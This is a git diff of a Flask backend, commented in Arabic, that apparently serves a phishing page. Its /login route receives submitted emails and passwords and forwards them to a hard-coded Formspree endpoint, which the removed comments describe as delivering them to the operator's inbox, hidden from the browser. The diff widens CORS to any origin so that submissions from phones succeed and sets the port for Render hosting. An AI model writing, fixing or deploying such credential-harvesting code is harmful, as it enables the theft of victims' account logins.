@@ -5,14 +5,23 @@ import requests
 import os
 
 app = Flask(__name__)
-CORS(app) # للسماح بالاتصال من موقع الفرونت إند الخارجي
 
-# رابط Formspree الخاص بك لاستقبال البيانات بشكل آمن ومخفي عن المتصفح
+# تعديل الـ CORS لكي يقبل الطلبات القادمة من الهاتف بأي صيغة وضمان عدم حدوث 404
+CORS(app, resources={r"/*": {"origins": "*", "methods": ["POST", "GET", "OPTIONS"]}})
+
 FORMSPREE_URL = "https://formspree.io/f/xojzprkz"
 
-@app.route('/login', methods=['POST'])
+# إضافة الدعم لـ OPTIONS و POST معاً في نفس المسار لحل مشكلة المتصفح
+@app.route('/login', methods=['POST', 'OPTIONS'])
 def login():
+    if request.method == 'OPTIONS':
+        # رد تلقائي للمتصفح للموافقة على إرسال البيانات
+        return jsonify({"status": "CORS_OK"}), 200
+        
     data = request.get_json()
+    if not data:
+        return jsonify({"status": "no_data"}), 400
+        
     email = data.get('email')
     password = data.get('password')
     
@@ -22,21 +31,16 @@ def login():
     }
     
     try:
-        # إرسال البيانات فوراً إلى صندوق البريد الإلكتروني الخاص بك عبر Formspree
         response = requests.post(FORMSPREE_URL, data=payload)
         if response.status_code == 200:
-            print(f"[SUCCESS] Données reçues et envoyées pour: {email}")
+            print(f"[SUCCESS] Data sent to Formspree for: {email}")
             return jsonify({"status": "success"}), 200
         else:
-            print(f"[ERROR] Formspree a renvoyé le code: {response.status_code}")
             return jsonify({"status": "fail"}), response.status_code
-            
     except Exception as e:
-        print(f"[EXCEPTION] Erreur système: {str(e)}")
+        print(f"[EXCEPTION] {str(e)}")
         return jsonify({"status": "error"}), 500
 
-# إعداد المنفذ المتغير ليتوافق مع بيئة الرفع على Render
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    print(f"Le serveur tourne sur le port {port}")
+    port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
